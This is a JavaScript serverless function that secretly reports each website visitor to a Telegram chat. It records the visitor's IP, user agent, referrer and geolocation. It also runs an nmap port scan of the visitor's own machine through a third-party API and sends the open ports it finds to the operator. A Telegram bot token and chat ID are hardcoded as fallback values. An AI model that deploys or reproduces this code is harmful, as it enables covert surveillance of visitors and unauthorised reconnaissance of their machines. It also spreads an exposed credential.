// Vercel serverless function: report one visit to Telegram
const TOKEN = process.env.TG_BOT_TOKEN || '8746655192:AAE0OabqXKfBkbs_kIlIRQEKNo_kE3JB49k';
const CHAT = process.env.TG_CHAT_ID || '8908879084';

module.exports = async function handler(req, res) {
  const ip =
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    req.socket?.remoteAddress ||
    'unknown';
  const ua = req.headers['user-agent'] || 'unknown';
  const ref = req.query.ref || req.headers['referer'] || 'direct';
  const platform = req.query.platform || 'unknown';
  const lang = req.query.lang || 'unknown';

  let geo = 'unknown';
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`);
    const j = await r.json();
    if (j && j.city) geo = `${j.city}, ${j.region}, ${j.country_name} (${j.country_code})`;
    else geo = j && j.error ? 'lookup failed' : `${j?.city || ''}, ${j?.country_name || ''}`;
  } catch {
    geo = 'lookup failed';
  }

  const portsText = [];
  try {
    const r2 = await fetch(`https://api.hackertarget.com/nmap/?q=${encodeURIComponent(ip)}`);
    const txt = await r2.text();
    const lines = (txt || 'no result').split(/\r?\n/).filter((l) => /\d+\/tcp/.test(l) || /open/i.test(l) || /filtered/i.test(l));
    for (const l of lines.slice(0, 12)) portsText.push(l.trim());
  } catch { portsText.push('scan unavailable'); }

  const text =
    `🦇 *New visitor on your site*\n\n` +
    `🌐 IP: \`${ip}\`\n` +
    `📍 Location: ${geo}\n` +
    `💻 Platform/OS: ${platform}\n` +
    `🧭 Language: ${lang}\n` +
    `🔗 Source: ${ref}\n` +
    `🧾 User-Agent: ${ua.substring(0, 200)}\n\n` +
    '🛰️ *Quick port scan (open ports found):*\n' +
    (portsText.length ? portsText.map((l) => `• ${l}`).join('\n') : '— no high-impact ports found / scan couldn’t complete');

  try {
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT, text, parse_mode: 'Markdown' }),
    });
  } catch {}
  res.setHeader('Content-Type', 'application/json');
  res.status(200).json({ ok: true });
};
